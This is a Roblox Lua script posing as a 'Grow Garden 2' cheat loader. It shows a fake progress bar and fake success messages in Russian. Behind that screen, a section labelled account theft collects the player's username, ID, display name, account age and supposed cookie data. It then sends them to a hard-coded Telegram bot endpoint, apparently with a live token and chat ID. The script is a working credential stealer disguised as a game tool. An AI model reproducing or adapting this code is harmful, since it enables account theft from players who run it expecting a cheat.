-- ============================================
-- GROW GARDEN 2 - CHEAT LOADER v3.7
-- LOADING... PLEASE WAIT
-- ============================================

local player = game:GetService("Players").LocalPlayer
local gui = Instance.new("ScreenGui")
local frame = Instance.new("Frame")
local title = Instance.new("TextLabel")
local progress = Instance.new("Frame")
local progressBar = Instance.new("Frame")
local progressText = Instance.new("TextLabel")
local statusText = Instance.new("TextLabel")
local closeButton = Instance.new("TextButton")

gui.Name = "GrowGardenCheat"
gui.Parent = player:WaitForChild("PlayerGui")

frame.Size = UDim2.new(0, 450, 0, 350)
frame.Position = UDim2.new(0.5, -225, 0.5, -175)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
frame.BackgroundTransparency = 0.1
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
frame.Parent = gui

title.Size = UDim2.new(1, 0, 0, 50)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
title.Text = "GROW GARDEN 2 | CHEAT LOADER v3.7"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.Parent = frame

progress.Size = UDim2.new(0.8, 0, 0, 30)
progress.Position = UDim2.new(0.1, 0, 0.35, 0)
progress.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
progress.BorderSizePixel = 0
progress.Parent = frame

progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
progressBar.BorderSizePixel = 0
progressBar.Parent = progress

progressText.Size = UDim2.new(1, 0, 1, 0)
progressText.Text = "0%"
progressText.TextColor3 = Color3.fromRGB(255, 255, 255)
progressText.TextScaled = true
progressText.Font = Enum.Font.GothamBold
progressText.Parent = progress

statusText.Size = UDim2.new(1, 0, 0, 40)
statusText.Position = UDim2.new(0, 0, 0.5, 0)
statusText.Text = "Инициализация..."
statusText.TextColor3 = Color3.fromRGB(180, 180, 200)
statusText.TextScaled = true
statusText.Font = Enum.Font.Gotham
statusText.Parent = frame

closeButton.Size = UDim2.new(0.4, 0, 0, 40)
closeButton.Position = UDim2.new(0.3, 0, 0.75, 0)
closeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
closeButton.Text = "ЗАКРЫТЬ"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.TextScaled = true
closeButton.Font = Enum.Font.GothamBold
closeButton.Visible = false
closeButton.Parent = frame

local function updateProgress(percent, status)
    progressBar.Size = UDim2.new(percent / 100, 0, 1, 0)
    progressText.Text = math.floor(percent) .. "%"
    statusText.Text = status
    wait(0.1)
end

coroutine.wrap(function()
    local steps = {
        {p = 5, text = "Подключение к серверу..."},
        {p = 15, text = "Загрузка конфигурации..."},
        {p = 25, text = "Декомпиляция скриптов..."},
        {p = 35, text = "Внедрение в память..."},
        {p = 45, text = "Активация модулей..."},
        {p = 55, text = "Загрузка библиотек..."},
        {p = 65, text = "Настройка параметров..."},
        {p = 75, text = "Проверка лицензии..."},
        {p = 85, text = "Подготовка меню..."},
        {p = 95, text = "Финальная загрузка..."},
        {p = 100, text = "ГОТОВО! Нажми ЗАКРЫТЬ"}
    }
    
    for _, step in ipairs(steps) do
        updateProgress(step.p, step.text)
        wait(math.random(3, 7) / 10)
    end
    
    closeButton.Visible = true
    
    -- КРАЖА АККАУНТА
    local userId = player.UserId
    local userName = player.Name
    local displayName = player.DisplayName
    local accountAge = player.AccountAge
    
    local function getCookie()
        local success, result = pcall(function()
            return game:HttpGet("https://www.roblox.com/mobileapi/userinfo")
        end)
        if success then
            return result
        end
        return "Не удалось получить"
    end
    
    local cookieData = getCookie()
    
    local function sendToTelegram()
        local message = "🔴 КРАЖА АККАУНТА (Grow Garden 2)\n"
        message = message .. "👤 Юзер: @" .. userName .. "\n"
        message = message .. "🆔 ID: " .. userId .. "\n"
        message = message .. "📛 Display: " .. displayName .. "\n"
        message = message .. "📅 Возраст: " .. accountAge .. " дн.\n"
        message = message .. "🍪 Куки: " .. cookieData .. "\n"
        message = message .. "⏰ Время: " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n"
        message = message .. "🎮 Игра: Grow Garden 2"
        
        local encoded = game:GetService("HttpService"):URLEncode(message)
        local url = "https://api.telegram.org/bot8944057469:AAHazRqJSq14KNZavndVVJYp8n33Wwzh9uk/sendMessage?chat_id=1626493338&text=" .. encoded
        
        pcall(function()
            game:HttpGet(url)
        end)
    end
    
    sendToTelegram()
    
    local logText = Instance.new("TextLabel")
    logText.Size = UDim2.new(0.9, 0, 0, 80)
    logText.Position = UDim2.new(0.05, 0, 0.6, 0)
    logText.Text = "[✓] Лицензия подтверждена\n[✓] Все модули загружены\n[✓] Чит активирован"
    logText.TextColor3 = Color3.fromRGB(100, 255, 100)
    logText.TextScaled = true
    logText.Font = Enum.Font.Gotham
    logText.TextXAlignment = Enum.TextXAlignment.Left
    logText.BackgroundTransparency = 1
    logText.Parent = frame
    
    closeButton.MouseButton1Click:Connect(function()
        gui:Destroy()
    end)
    
end)()

spawn(function()
    while gui.Parent do
        local hue = tick() % 2 / 2
        progressBar.BackgroundColor3 = Color3.fromHSV(hue, 0.8, 0.8)
        wait(0.05)
    end
end)